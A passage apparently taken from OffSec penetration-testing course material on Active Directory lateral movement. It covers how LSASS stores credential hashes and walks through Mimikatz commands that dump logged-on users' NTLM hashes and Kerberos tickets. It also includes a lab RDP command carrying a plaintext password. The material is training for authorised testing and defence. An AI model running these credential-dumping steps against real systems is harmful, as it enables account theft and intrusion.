### Lateral Movement in Active Directory: Understanding Password Hashes and Kerberos

To effectively discuss lateral movement in Active Directory (AD), we must first understand the various password hashes used with Kerberos and how they are stored. This section builds on the information covered in the Password Attacks Module, focusing specifically on cached credentials and tickets in the context of AD.

#### Kerberos and Password Hash Storage

Microsoft's implementation of Kerberos uses single sign-on (SSO), which necessitates storing password hashes to renew Ticket-Granting Ticket (TGT) requests. In modern versions of Windows, these hashes are stored in the memory space of the Local Security Authority Subsystem Service (LSASS).

- **LSASS Memory Space**: The hashes are stored in the LSASS process, which is part of the operating system and runs as SYSTEM.
- **Access Requirements**: To access these hashes, one needs SYSTEM or local administrator permissions. This often requires a local privilege escalation attack.

The data structures used to store the hashes in memory are not publicly documented and are encrypted with an LSASS-stored key, making the extraction process more complex.

#### Tools for Extracting Hashes

Despite the complexity, several tools have been developed to extract these hashes. The most popular tool is Mimikatz. Let’s explore how to use Mimikatz to extract domain hashes on a Windows 11 system.

#### Example: Using Mimikatz

1. **Connect to the Target Machine**:
   - Connect to the target machine (e.g., `CLIENT75`) via Remote Desktop Protocol (RDP) using a local administrator account.
   ```bash
   kali@kali:~$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75
   ```

2. **Start PowerShell as Administrator**:
   - Open a PowerShell session with elevated privileges.

3. **Run Mimikatz**:
   - Navigate to the directory containing Mimikatz and start the tool.
   ```powershell
   PS C:\Windows\system32> cd C:\Tools
   PS C:\Tools\> .\mimikatz.exe
   ```

4. **Enable SeDebugPrivilege**:
   - Use the `privilege::debug` command to enable the SeDebugPrivilege, which allows interaction with processes owned by other accounts.
   ```powershell
   mimikatz # privilege::debug
   Privilege '20' OK
   ```

5. **Dump Credentials**:
   - Use the `sekurlsa::logonpasswords` command to dump the credentials of all logged-on users.
   ```powershell
   mimikatz # sekurlsa::logonpasswords
   ```

   The output will show credential information for all logged-on users, including NTLM and SHA-1 hashes.

#### Defensive Techniques

To prevent tools like Mimikatz from extracting hashes, you can enable additional Local Security Authority (LSA) protection. This involves setting a registry key to prevent reading memory from the LSASS process. For more advanced defensive techniques, consider the Evasion Techniques and Breaching Defenses course (PEN-300).

#### Kerberos Tickets

Mimikatz can also be used to interact with and retrieve Kerberos tickets stored in LSASS. For example, after listing the contents of an SMB share, you can use Mimikatz to display the stored tickets.

1. **List SMB Share**:
   - List the contents of an SMB share to create and cache a service ticket.
   ```powershell
   PS C:\Users\jeff> dir \\web04.corp.com\backup
   ```

2. **Display Tickets**:
   - Use the `sekurlsa::tickets` command to show the tickets stored in memory.
   ```powershell
   mimikatz # sekurlsa::tickets
   ```

   The output will show both TGT and TGS tickets, which can be used for further attacks.

#### Public Key Infrastructure (PKI) in AD

Before diving into AD authentication attacks, it's important to understand the role of Public Key Infrastructure (PKI) in AD. Microsoft provides the Active Directory Certificate Services (AD CS) role to implement PKI, which exchanges digital certificates between authenticated users and trusted resources.

- **Certification Authority (CA)**: A server installed as a CA can issue and revoke digital certificates.
- **Non-Exportable Private Keys**: Certificates may have non-exportable private keys for security reasons, but Mimikatz can patch the CryptoAPI to make these keys exportable.

#### Learning Objectives

This learning unit covers the following objectives:

- **Use password attacks to obtain valid user credentials**
- **Abuse enabled user account options**
- **Abuse the Kerberos SPN authentication mechanism**
- **Forge service tickets**
- **Impersonate a domain controller to retrieve any domain user credentials**

By understanding these concepts and techniques, you will be better equipped to perform and defend against AD authentication attacks.

---

**PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.**

**Made in Morocco**

**Penetration Testing with Kali Linux**